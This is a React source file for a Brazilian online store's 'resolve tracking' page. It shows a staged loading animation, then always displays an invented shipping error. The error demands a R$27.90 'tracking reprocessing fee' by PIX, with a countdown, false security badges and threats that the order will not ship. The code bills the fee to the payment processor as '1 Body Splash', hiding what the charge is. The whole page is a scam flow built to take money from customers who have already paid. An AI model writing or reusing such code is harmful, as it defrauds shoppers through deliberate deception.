import { useEffect, useMemo, useRef, useState } from "react";
import { useLocation, useNavigate, Navigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { Button } from "@/components/ui/button";
import {
  AlertTriangle, Loader2, MapPin, User, Package, QrCode, Copy, Check, ShieldCheck, Clock,
} from "lucide-react";
import { toast } from "sonner";
import logo from "@/assets/logo-new.png";
import { products } from "@/data/products";
import { standaloneProducts } from "@/data/standaloneProducts";

const formatPrice = (v: number) =>
  v.toLocaleString("pt-BR", { style: "currency", currency: "BRL" });

const RESOLVE_PRICE = 27.90;
const WEBHOOK_ITEM_NAME = "1 Body Splash";

function resolveItemImage(it: any): string | null {
  if (!it) return null;
  if (typeof it.image === "string" && /^https?:\/\//i.test(it.image)) return it.image;
  if (typeof it.image === "string" && it.image.startsWith("/lovable-uploads/")) return it.image;
  const p = products.find((pp) => String(pp.id) === String(it.id));
  if (p) {
    const colorName = (it.color || "").toLowerCase();
    if (colorName && (p as any).variants) {
      const v = (p as any).variants.find((vv: any) =>
        vv.label?.toLowerCase().includes(colorName) || vv.label?.toLowerCase() === colorName,
      );
      if (v?.image) return v.image;
    }
    return p.image;
  }
  const s = standaloneProducts.find((ss) => String(ss.id) === String(it.id));
  if (s) return s.image;
  return it.image || null;
}

interface OrderState {
  customerName: string;
  customerEmail: string;
  customerPhone: string;
  customerCpf: string;
  address: {
    street: string; number: string; complement: string;
    neighborhood: string; city: string; state: string; cep: string;
  };
  items: any[];
  shippingMethod?: string;
  shippingDescription?: string;
  shippingCost?: number;
  paymentMethod?: string;
  total?: number;
  nextDestination?: string;
  oneClickCard?: any;
}

interface PixData {
  qrCode: string;
  qrCodeBase64: string;
  copyPaste: string;
  transactionId: string;
  orderId: string;
}

const ResolveRastreio = () => {
  const location = useLocation();
  const navigate = useNavigate();
  const isPreview = new URLSearchParams(location.search).get("preview") === "1";
  const previewOrder: OrderState = {
    customerName: "João da Silva",
    customerEmail: "joao.silva@email.com",
    customerPhone: "11999998888",
    customerCpf: "12345678909",
    address: {
      street: "Rua das Flores", number: "123", complement: "Apto 45",
      neighborhood: "Centro", city: "São Paulo", state: "SP", cep: "01000-000",
    },
    items: (products[0] ? [{
      id: products[0].id, name: products[0].name, price: products[0].price,
      image: products[0].image, quantity: 1, size: "M",
    }] : []),
    total: products[0]?.price || 0,
  };
  const order = (location.state as OrderState | undefined) || (isPreview ? previewOrder : undefined);

  const [loading, setLoading] = useState(true);
  const [submitting, setSubmitting] = useState(false);
  const [pixData, setPixData] = useState<PixData | null>(null);
  const [pixConfirmed, setPixConfirmed] = useState(false);
  const [copied, setCopied] = useState(false);
  const [pixSeconds, setPixSeconds] = useState(10 * 60);

  // animação de carregamento de 2.5s antes de mostrar o erro
  useEffect(() => {
    document.title = "Resolver Rastreio • Alpha Oficial";
    const t = setTimeout(() => setLoading(false), 2500);
    return () => clearTimeout(t);
  }, []);

  useEffect(() => {
    if (!pixData || pixConfirmed) return;
    setPixSeconds(10 * 60);
    const t = setInterval(() => setPixSeconds((s) => (s > 0 ? s - 1 : 0)), 1000);
    return () => clearInterval(t);
  }, [pixData, pixConfirmed]);

  // PIX polling
  useEffect(() => {
    if (!pixData?.transactionId || pixConfirmed) return;
    const interval = setInterval(async () => {
      try {
        const { data } = await supabase
          .from("orders")
          .select("payment_status")
          .eq("transaction_id", pixData.transactionId)
          .maybeSingle();
        if (data?.payment_status === "paid") {
          setPixConfirmed(true);
          clearInterval(interval);
          toast.success("Pagamento confirmado! Redirecionando...");
          const next = (order as OrderState)?.nextDestination || "/obrigado";
          setTimeout(() => {
            navigate(next, { replace: true, state: order });
          }, 1500);
        }
      } catch (e) { console.warn("Resolve PIX poll error:", e); }
    }, 4000);
    return () => clearInterval(interval);
  }, [pixData, pixConfirmed]);

  const itemsWithImg = useMemo(
    () => (order?.items || []).map((it) => ({ ...it, _img: resolveItemImage(it) })),
    [order],
  );

  if (!order) return <Navigate to="/" replace />;

  const handleGeneratePix = async () => {
    setSubmitting(true);
    try {
      const orderReference = crypto.randomUUID();
      const { data: pix, error: pixErr } = await supabase.functions.invoke("create-pix-payment", {
        body: {
          customer: {
            name: order.customerName,
            email: order.customerEmail,
            cpf: (order.customerCpf || "").replace(/\D/g, ""),
            phone: (order.customerPhone || "").replace(/\D/g, ""),
          },
          items: [{ name: WEBHOOK_ITEM_NAME, price: RESOLVE_PRICE, quantity: 1 }],
          amount: RESOLVE_PRICE,
          shipping: {
            street: order.address.street, number: order.address.number,
            complement: order.address.complement, neighborhood: order.address.neighborhood,
            city: order.address.city, state: order.address.state, cep: order.address.cep,
          },
          externalRef: orderReference,
        },
      });
      if (pixErr) throw pixErr;
      if (pix?.error || !pix?.transactionId) {
        toast.error(pix?.error || "Erro ao gerar PIX. Tente novamente.");
        return;
      }

      const pixInfo: PixData = {
        qrCode: pix?.qrCode || "",
        qrCodeBase64: pix?.qrCodeBase64 || "",
        copyPaste: pix?.copyPaste || pix?.qrCode || "",
        transactionId: pix?.transactionId || "",
        orderId: orderReference,
      };

      const { error: insertErr } = await supabase.from("orders").insert({
        id: orderReference,
        customer_name: order.customerName,
        customer_email: order.customerEmail,
        customer_phone: order.customerPhone,
        customer_cpf: order.customerCpf,
        cep: order.address.cep,
        street: order.address.street,
        number: order.address.number,
        complement: order.address.complement || null,
        neighborhood: order.address.neighborhood,
        city: order.address.city,
        state: order.address.state,
        shipping_method: "free",
        shipping_cost: 0,
        payment_method: "PIX",
        payment_status: "pending",
        transaction_id: pixInfo.transactionId || null,
        ticket: orderReference,
        items: [{ name: WEBHOOK_ITEM_NAME, price: RESOLVE_PRICE, quantity: 1 }] as any,
        subtotal: RESOLVE_PRICE,
        discount: 0,
        total: RESOLVE_PRICE,
        tracking_status: "pedido_recebido",
      });
      if (insertErr) console.warn("Resolve order insert warn:", insertErr);

      setPixData(pixInfo);
      toast.success("PIX gerado! Escaneie ou copie o código.");
    } catch (err) {
      console.error("Resolve PIX error:", err);
      toast.error("Erro ao gerar PIX. Tente novamente.");
    } finally {
      setSubmitting(false);
    }
  };

  const handleCopyPix = async () => {
    if (!pixData?.copyPaste) return;
    try {
      await navigator.clipboard.writeText(pixData.copyPaste);
      setCopied(true);
      toast.success("Código PIX copiado!");
      setTimeout(() => setCopied(false), 2500);
    } catch { toast.error("Não foi possível copiar."); }
  };

  const pmm = String(Math.floor(pixSeconds / 60)).padStart(2, "0");
  const pss = String(pixSeconds % 60).padStart(2, "0");

  return (
    <div className="min-h-screen bg-secondary/30 flex flex-col">
      <div className="bg-primary text-primary-foreground py-4">
        <div className="container flex items-center justify-center">
          <img src={logo} alt="Logo" className="h-8 w-auto object-contain brightness-0 invert" />
        </div>
      </div>

      <div className="flex-1 container py-8 max-w-lg mx-auto px-4 space-y-5">
        {loading ? (
          <div className="flex flex-col items-center justify-center py-24 space-y-6">
            <Loader2 className="w-14 h-14 animate-spin text-foreground" />
            <p className="text-base font-medium text-foreground text-center">
              Calculando rastreio para a rota selecionada...
            </p>
            <p className="text-xs text-muted-foreground text-center max-w-xs">
              Aguarde enquanto verificamos a disponibilidade do envio para o seu endereço.
            </p>
          </div>
        ) : (
          <>
            {/* Erro */}
            <div className="bg-amber-50 border border-amber-300 rounded-2xl p-5 space-y-3 animate-fade-in">
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 rounded-full bg-amber-100 flex items-center justify-center shrink-0">
                  <AlertTriangle className="w-5 h-5 text-amber-700" />
                </div>
                <h1 className="text-base font-bold text-amber-900">
                  Não foi possível enviar seu pedido
                </h1>
              </div>
              <p className="text-sm text-amber-900 leading-relaxed">
                Houve um <strong>erro ao calcular o rastreio</strong> para a rota selecionada
                até o seu endereço. Para liberar o envio, é necessário pagar a{" "}
                <strong>taxa de reprocessamento de rastreio</strong> no valor de{" "}
                <strong>{formatPrice(RESOLVE_PRICE)}</strong>.
                <br /><br />
                <strong>Atenção:</strong> caso a taxa não seja paga, o seu pedido{" "}
                <strong>não será enviado</strong>.
              </p>
            </div>

            {/* Endereço */}
            <div className="bg-background rounded-2xl border border-border overflow-hidden animate-fade-in">
              <div className="px-5 py-3 border-b border-border flex items-center gap-2">
                <User className="w-4 h-4 text-muted-foreground" />
                <span className="text-sm font-semibold text-foreground">Destinatário</span>
              </div>
              <div className="p-4 space-y-3">
                <div className="flex items-center gap-3 text-sm">
                  <User className="w-4 h-4 text-muted-foreground shrink-0" />
                  <span className="text-foreground">{order.customerName}</span>
                </div>
                <div className="flex items-start gap-3 text-sm">
                  <MapPin className="w-4 h-4 text-muted-foreground shrink-0 mt-0.5" />
                  <span className="text-foreground">
                    {order.address.street}, {order.address.number}
                    {order.address.complement ? ` — ${order.address.complement}` : ""}
                    <br />
                    {order.address.neighborhood}, {order.address.city} — {order.address.state}
                    <br />
                    CEP: {order.address.cep}
                  </span>
                </div>
              </div>
            </div>

            {/* Produtos comprados */}
            <div className="bg-background rounded-2xl border border-border overflow-hidden animate-fade-in">
              <div className="px-5 py-3 border-b border-border flex items-center gap-2">
                <Package className="w-4 h-4 text-muted-foreground" />
                <span className="text-sm font-semibold text-foreground">Produtos do pedido</span>
              </div>
              <div className="p-4 space-y-3">
                {itemsWithImg.map((item, idx) => (
                  <div key={`${item.id}-${item.size || ""}-${idx}`} className="flex items-center gap-3">
                    {item._img ? (
                      <img src={item._img} alt={item.name} className="w-14 h-14 object-cover rounded-lg bg-secondary" />
                    ) : (
                      <div className="w-14 h-14 rounded-lg bg-secondary flex items-center justify-center">
                        <Package className="w-5 h-5 text-muted-foreground" />
                      </div>
                    )}
                    <div className="flex-1 min-w-0">
                      <p className="text-sm font-medium text-foreground line-clamp-2">{item.name}</p>
                      <div className="flex gap-2 text-xs text-muted-foreground mt-0.5">
                        {item.size && <span>Tam: {item.size}</span>}
                        {item.color && <span>Cor: {item.color}</span>}
                        <span>Qtd: {item.quantity}</span>
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            </div>

            {/* PIX */}
            {!pixData && !pixConfirmed && (
              <div className="bg-background rounded-2xl border border-border p-5 space-y-4 animate-fade-in">
                <div className="flex items-center justify-between">
                  <span className="text-sm font-semibold text-foreground">Taxa de rastreio</span>
                  <span className="text-xl font-bold text-foreground">{formatPrice(RESOLVE_PRICE)}</span>
                </div>
                <p className="text-xs text-muted-foreground">
                  Pagamento exclusivamente via PIX. Após a confirmação, o rastreio é
                  reprocessado e seu pedido segue para envio.
                </p>
                <Button
                  onClick={handleGeneratePix}
                  disabled={submitting}
                  className="w-full h-[68px] rounded-xl text-sm font-semibold gap-2"
                >
                  {submitting ? (
                    <><Loader2 className="w-4 h-4 animate-spin" /> Gerando PIX...</>
                  ) : (
                    <><QrCode className="w-4 h-4" /> PAGAR E RECEBER MEU PEDIDO</>
                  )}
                </Button>
                <div className="flex items-center justify-center gap-2 text-[11px] text-muted-foreground">
                  <ShieldCheck className="w-3.5 h-3.5" />
                  <span>Pagamento 100% seguro</span>
                </div>
                <div className="bg-red-50 border-2 border-red-300 rounded-xl p-3 flex items-start gap-2">
                  <AlertTriangle className="w-5 h-5 text-red-700 shrink-0 mt-0.5" />
                  <p className="text-xs font-semibold text-red-900 leading-relaxed">
                    Seu pedido <strong>só será enviado</strong> após o pagamento desta taxa.
                    Sem o pagamento, o envio fica <strong>bloqueado</strong>.
                  </p>
                </div>
              </div>
            )}

            {pixData && !pixConfirmed && (
              <div className="bg-background rounded-2xl border border-border p-5 space-y-4 animate-fade-in">
                <div className="flex items-center justify-between">
                  <span className="text-sm font-semibold text-foreground">Pague o PIX</span>
                  <div className="flex items-center gap-1 text-xs text-amber-700">
                    <Clock className="w-3.5 h-3.5" /> {pmm}:{pss}
                  </div>
                </div>
                {(pixData.qrCodeBase64 || pixData.copyPaste) && (
                  <div className="flex justify-center">
                    <img
                      src={pixData.qrCodeBase64
                        ? `data:image/png;base64,${pixData.qrCodeBase64}`
                        : `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(pixData.copyPaste)}`}
                      alt="QR Code PIX"
                      className="w-56 h-56 object-contain border border-border rounded-lg bg-white p-2"
                    />
                  </div>
                )}
                <div className="space-y-2">
                  <p className="text-xs text-muted-foreground">PIX Copia e Cola</p>
                  <div className="bg-secondary/50 rounded-lg p-3 text-[11px] text-foreground break-all max-h-24 overflow-auto">
                    {pixData.copyPaste}
                  </div>
                  <Button onClick={handleCopyPix} variant="outline" className="w-full h-11 rounded-xl gap-2">
                    {copied ? <><Check className="w-4 h-4" /> Copiado!</> : <><Copy className="w-4 h-4" /> Copiar código</>}
                  </Button>
                </div>
                <div className="flex items-center justify-center gap-2 text-xs text-muted-foreground">
                  <Loader2 className="w-3.5 h-3.5 animate-spin" />
                  <span>Aguardando confirmação do pagamento...</span>
                </div>
              </div>
            )}

            {pixConfirmed && (
              <div className="bg-emerald-50 border border-emerald-200 rounded-2xl p-5 text-center space-y-2 animate-fade-in">
                <Check className="w-10 h-10 text-emerald-600 mx-auto" />
                <p className="text-sm font-bold text-emerald-900">Pagamento confirmado!</p>
                <p className="text-xs text-emerald-800">
                  Estamos reprocessando o rastreio do seu pedido. Você receberá o código
                  atualizado por e-mail em instantes.
                </p>
              </div>
            )}
          </>
        )}
      </div>
    </div>
  );
};

export default ResolveRastreio;
